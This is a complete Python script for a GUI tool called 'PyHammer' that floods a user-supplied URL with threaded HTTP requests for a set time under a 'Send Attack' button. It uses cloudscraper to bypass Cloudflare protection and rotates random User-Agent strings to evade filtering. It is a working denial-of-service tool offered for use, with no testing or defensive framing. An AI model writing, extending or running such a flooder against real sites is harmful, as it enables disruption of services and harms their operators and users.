import tkinter as tk
from tkinter import messagebox
from concurrent.futures import ThreadPoolExecutor, as_completed
import cloudscraper
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
import time

class PyHammer:
    def __init__(self, master):
        self.master = master
        master.title("PyHammer")
        master.geometry("400x300")
        master.configure(bg='#2E2E2E')
        
        self.label_url = tk.Label(master, text="URL:", bg='#2E2E2E', fg='#FFFFFF', font=("Helvetica", 12))
        self.label_url.pack(pady=(20, 5))
        
        self.entry_url = tk.Entry(master, width=50)
        self.entry_url.pack(pady=(0, 10))
        
        self.label_threads = tk.Label(master, text="Threads:", bg='#2E2E2E', fg='#FFFFFF', font=("Helvetica", 12))
        self.label_threads.pack(pady=(5, 5))
        
        self.entry_threads = tk.Entry(master, width=50)
        self.entry_threads.pack(pady=(0, 10))
        
        self.label_time = tk.Label(master, text="Time (s):", bg='#2E2E2E', fg='#FFFFFF', font=("Helvetica", 12))
        self.label_time.pack(pady=(5, 5))
        
        self.entry_time = tk.Entry(master, width=50)
        self.entry_time.pack(pady=(0, 20))
        
        self.button_attack = tk.Button(master, text="🚀 Send Attack 🚀", command=self.start_attack, bg='#1C1C1C', fg='#FFFFFF', font=("Helvetica", 14))
        self.button_attack.pack(pady=(0, 20))
        
        self.running = False
        
    def start_attack(self):
        url = self.entry_url.get()
        threads = int(self.entry_threads.get())
        duration = int(self.entry_time.get())
        
        if not url or not threads or not duration:
            messagebox.showwarning("Input Error", "All fields must be filled out!")
            return
        
        self.disable_inputs()
        self.running = True
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(self.send_requests, url, duration) for _ in range(threads)]
            for future in as_completed(futures):
                pass  # Wait for all threads to complete
    
    def send_requests(self, url, duration):
        scraper = cloudscraper.create_scraper()
        
        software_names = [SoftwareName.CHROME.value, SoftwareName.FIREFOX.value, SoftwareName.EDGE.value, SoftwareName.OPERA.value]
        operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value, OperatingSystem.MAC.value]
        user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)
        
        end_time = time.time() + duration
        
        while time.time() < end_time and self.running:
            headers = {'User-Agent': user_agent_rotator.get_random_user_agent()}
            try:
                response = scraper.get(url, headers=headers)
                print(f"Request sent: {response.status_code}")
            except Exception as e:
                print(f"Request failed: {e}")
        
        self.stop_attack()
    
    def stop_attack(self):
        self.running = False
        self.enable_inputs()
    
    def disable_inputs(self):
        self.entry_url.config(state='disabled')
        self.entry_threads.config(state='disabled')
        self.entry_time.config(state='disabled')
        self.button_attack.config(state='disabled')
    
    def enable_inputs(self):
        self.entry_url.config(state='normal')
        self.entry_threads.config(state='normal')
        self.entry_time.config(state='normal')
        self.button_attack.config(state='normal')

def main():
    root = tk.Tk()
    app = PyHammer(root)
    root.mainloop()

if __name__ == "__main__":
    main()
